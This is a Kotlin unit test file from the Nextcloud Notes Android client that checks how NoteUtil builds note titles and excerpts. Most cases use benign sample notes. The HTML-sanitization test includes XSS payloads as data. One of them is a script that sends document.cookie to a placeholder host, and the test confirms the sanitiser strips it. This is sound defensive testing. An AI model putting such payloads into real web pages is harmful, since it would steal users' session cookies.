/*
 * Nextcloud Notes - Android Client
 *
 * SPDX-FileCopyrightText: 2015-2026 Nextcloud GmbH and Nextcloud contributors
 * SPDX-License-Identifier: GPL-3.0-or-later
 */
package it.niedermann.owncloud.notes.shared.util

import android.os.Build
import androidx.core.text.HtmlCompat
import it.niedermann.android.markdown.MarkdownUtil
import junit.framework.TestCase
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

/**
 * Tests the NoteUtil.
 */
@RunWith(RobolectricTestRunner::class)
class NoteUtilTest : TestCase() {

    @Test
    fun testIsEmptyLine() {
        assertTrue(NoteUtil.isEmptyLine(" "))
        assertTrue(NoteUtil.isEmptyLine("\n"))
        assertTrue(NoteUtil.isEmptyLine("\n "))
        assertTrue(NoteUtil.isEmptyLine(" \n"))
        assertTrue(NoteUtil.isEmptyLine(" \n "))
        assertFalse(NoteUtil.isEmptyLine("a \n "))
    }

    @Test
    fun testGetLineWithoutMarkdown() {
        assertEquals("Test", NoteUtil.getLineWithoutMarkdown("Test", 0))
        assertEquals("Test", NoteUtil.getLineWithoutMarkdown("\nTest", 0))
        assertEquals("Foo", NoteUtil.getLineWithoutMarkdown("Foo\nBar", 0))
        assertEquals("Bar", NoteUtil.getLineWithoutMarkdown("Foo\nBar", 1))
        assertEquals("Foo", NoteUtil.getLineWithoutMarkdown("* Foo\n* Bar", 0))
        assertEquals("Bar", NoteUtil.getLineWithoutMarkdown("- Foo\nBar", 1))
        assertEquals("Foo", NoteUtil.getLineWithoutMarkdown("# Foo", 0))
    }

    @Test
    fun testGenerateNoteTitle() {
        assertEquals("Test", NoteUtil.generateNoteTitle("Test"))
        assertEquals("Test", NoteUtil.generateNoteTitle("Test\n"))
        assertEquals("Test", NoteUtil.generateNoteTitle("Test\nFoo"))
        assertEquals("Test", NoteUtil.generateNoteTitle("\nTest"))
        assertEquals("Test", NoteUtil.generateNoteTitle("\n\nTest"))

        // https://github.com/nextcloud/notes-android/issues/1104
        assertEquals("2021-03-24 - Example title", MarkdownUtil.removeMarkdown("2021-03-24 - Example title"))
    }

    @Test
    fun testGenerateNoteExcerpt() {
        testBasicExcerpts()
        testTitleMatchingExcerpts()
        testEmptyLineHandling()
        testMarkdownInContent()
        testMarkdownInTitle()
        testMarkdownInBoth()
        testHtmlSanitization()
        testEdgeCases()
        testRealisticUserNotes()
    }

    private fun testBasicExcerpts() {
        // title is different from content → return max. 200 characters starting with the first line which is not empty
        assertEquals("Test", NoteUtil.generateNoteExcerpt("Test", "Title"))
        assertEquals("Test   Foo", NoteUtil.generateNoteExcerpt("Test\nFoo", "Title"))
        assertEquals("Test   Foo   Bar", NoteUtil.generateNoteExcerpt("Test\nFoo\nBar", "Title"))
        assertEquals("", NoteUtil.generateNoteExcerpt("", "Title"))
    }

    private fun testTitleMatchingExcerpts() {
        // content actually starts with title → return max. 200 characters starting with the first character after the title
        assertEquals("", NoteUtil.generateNoteExcerpt("Title", "Title"))
        assertEquals("Foo", NoteUtil.generateNoteExcerpt("Title\nFoo", "Title"))
        assertEquals("Title   Bar", NoteUtil.generateNoteExcerpt("Title\nTitle\nBar", "Title"))
        assertEquals("", NoteUtil.generateNoteExcerpt("", "Title"))
    }

    private fun testEmptyLineHandling() {
        // some empty lines between the actual contents → Should be ignored
        assertEquals("", NoteUtil.generateNoteExcerpt("\nTitle", "Title"))
        assertEquals("Foo", NoteUtil.generateNoteExcerpt("\n\n\n\nTitle\nFoo", "Title"))
        assertEquals("Title   Bar", NoteUtil.generateNoteExcerpt("\nTitle\n\n\nTitle\nBar", "\n\nTitle"))
        assertEquals("", NoteUtil.generateNoteExcerpt("\n\n\n", "\nTitle"))
    }

    private fun testMarkdownInContent() {
        // content has markdown while titles, markdown is already stripped
        assertEquals("", NoteUtil.generateNoteExcerpt("# Title", "Title"))
        assertEquals("Foo", NoteUtil.generateNoteExcerpt("Title\n- Foo", "Title"))
    }

    private fun testMarkdownInTitle() {
        // title has markdown while contents markdown is stripped
        assertEquals("", NoteUtil.generateNoteExcerpt("Title", "# Title"))
        assertEquals("Foo", NoteUtil.generateNoteExcerpt("Title\nFoo", "- Title"))
        assertEquals("Title   Bar", NoteUtil.generateNoteExcerpt("Title\nTitle\nBar", "- Title"))
    }

    private fun testMarkdownInBoth() {
        // content and title have markdown
        assertEquals("", NoteUtil.generateNoteExcerpt("# Title", "# Title"))
        assertEquals("Foo", NoteUtil.generateNoteExcerpt("# Title\n- Foo", "- Title"))
        assertEquals("Title   Bar", NoteUtil.generateNoteExcerpt("- Title\nTitle\nBar", "- Title"))
    }

    private fun testHtmlSanitization() {
        val html = """
            <a href='example.com'>click</a>
            <img src=x onerror=alert(1)>
            <script>alert(1)</script>
        """.trimIndent()

        val expectedHtml = "<a href='example.com'>click</a>\n<img src=x>"
        assertEquals(expectedHtml, NoteUtil.generateNoteExcerpt(html, "Title"))
        assertEquals(expectedHtml, NoteUtil.generateNoteExcerpt(html, null))

        val scriptHtml = "<script>fetch('http://example.com?c='+document.cookie)</script><b>title</b>"
        val scriptExcerpt = NoteUtil.generateNoteExcerpt(scriptHtml, "Test")
        assertFalse("Excerpts should never contain executable scripts", scriptExcerpt.contains("<script>"))
    }

    private fun testEdgeCases() {
        val code = "if (a < b && b > c) { List<String> names = new ArrayList<>(); }"
        assertEquals(code, NoteUtil.generateNoteExcerpt(code, "Java Logic"))

        val uncompletedHtml = "<div><p>This note is never closed"
        assertTrue(NoteUtil.generateNoteExcerpt(uncompletedHtml, null).contains("This note is never closed"))

        val longHtml = "<div><p>Very long content that should be shortened eventually...</p></div>"
        assertFalse(NoteUtil.generateNoteExcerpt(longHtml, "Long Note").endsWith("<"))
    }

    private fun testRealisticUserNotes() {
        testShoppingListNote()
        testMeetingNotesNote()
        testRecipeNote()
        testJournalEntryNote()
        testCodeSnippetNote()
        testWebClippingNote()
        testTravelPlanNote()
    }

    private fun testShoppingListNote() {
        val shoppingList = """
            # Grocery Shopping
            - [ ] Milk
            - [ ] Eggs
            - [x] Bread
            - [ ] Apples
        """.trimIndent()

        val shoppingExcerpt = NoteUtil.generateNoteExcerpt(shoppingList, "Grocery Shopping")
        assertTrue(shoppingExcerpt.contains("Milk"))
        assertFalse(shoppingExcerpt.contains("Grocery Shopping"))
    }

    private fun testMeetingNotesNote() {
        val meetingNotes = """
            ## Team Meeting - 2024-02-12
            **Attendees:** John, Sarah, Mike
            
            ### Action Items:
            1. Review PR #123
            2. Update documentation
            3. Schedule follow-up meeting
        """.trimIndent()

        val meetingExcerpt = NoteUtil.generateNoteExcerpt(meetingNotes, "Team Meeting - 2024-02-12")
        assertTrue(meetingExcerpt.contains("Attendees"))
        assertTrue(meetingExcerpt.contains("Action Items"))
    }

    private fun testRecipeNote() {
        val recipeNote = """
            # Chocolate Chip Cookies
            
            Preheat oven to 350°F. Mix butter and sugar until fluffy.
            Add eggs and vanilla. Combine with dry ingredients.
            Bake for 12-15 minutes.
        """.trimIndent()

        val recipeExcerpt = NoteUtil.generateNoteExcerpt(recipeNote, "Chocolate Chip Cookies")
        assertTrue(recipeExcerpt.contains("Preheat oven"))
        assertTrue(recipeExcerpt.contains("350°F"))
    }

    private fun testJournalEntryNote() {
        val journalEntry = """
            Today was a productive day. I finished the quarterly report and had a great conversation
            with the team about the new project roadmap. Looking forward to tomorrow's presentation!
        """.trimIndent()

        val journalExcerpt = NoteUtil.generateNoteExcerpt(journalEntry, "Daily Journal")
        assertTrue(journalExcerpt.contains("productive day"))
        assertTrue(journalExcerpt.length <= 200)
    }

    private fun testCodeSnippetNote() {
        val codeSnippet = """
            # Python Script
```python
            def calculate_total(items):
                return sum(item.price for item in items)
```
            This function calculates the total price of all items in a list.
        """.trimIndent()

        val codeExcerpt = NoteUtil.generateNoteExcerpt(codeSnippet, "Python Script")
        assertTrue(codeExcerpt.contains("calculate_total"))
    }

    private fun testWebClippingNote() {
        val webClipping = """
            <article>
                <h1>10 Tips for Better Sleep</h1>
                <p>Getting quality sleep is essential for health. Here are some tips:</p>
                <ul>
                    <li>Maintain a consistent schedule</li>
                    <li>Avoid screens before bed</li>
                </ul>
            </article>
        """.trimIndent()

        val clippingExcerpt = NoteUtil.generateNoteExcerpt(webClipping, "Sleep Tips")
        assertTrue(clippingExcerpt.contains("<h1>"))
        assertTrue(clippingExcerpt.contains("quality sleep"))
    }

    private fun testTravelPlanNote() {
        val travelPlan = """
            ## Tokyo Trip - March 2024
            
            **Day 1:**
            - Arrive at Narita Airport
            - Check into hotel in Shibuya
            - Visit Senso-ji Temple
            
            **Day 2:**
            - Morning: Tsukiji Market
            - Afternoon: Akihabara shopping
        """.trimIndent()

        val travelExcerpt = NoteUtil.generateNoteExcerpt(travelPlan, "Tokyo Trip - March 2024")
        assertTrue(travelExcerpt.contains("Day 1"))
        assertTrue(travelExcerpt.contains("Narita Airport"))
    }

    /**
     * Has known issues on [Build.VERSION_CODES.LOLLIPOP_MR1] and
     * [Build.VERSION_CODES.M] due to incompatibilities of
     * [HtmlCompat.fromHtml]
     */
    @Test
    @Config(sdk = [30])
    fun testGenerateNoteExcerpt_sdk_30() {
        // content has markdown while titles markdown is already stripped
        assertEquals("Title   Bar", NoteUtil.generateNoteExcerpt("# Title\n- Title\n- Bar", "Title"))
    }
}
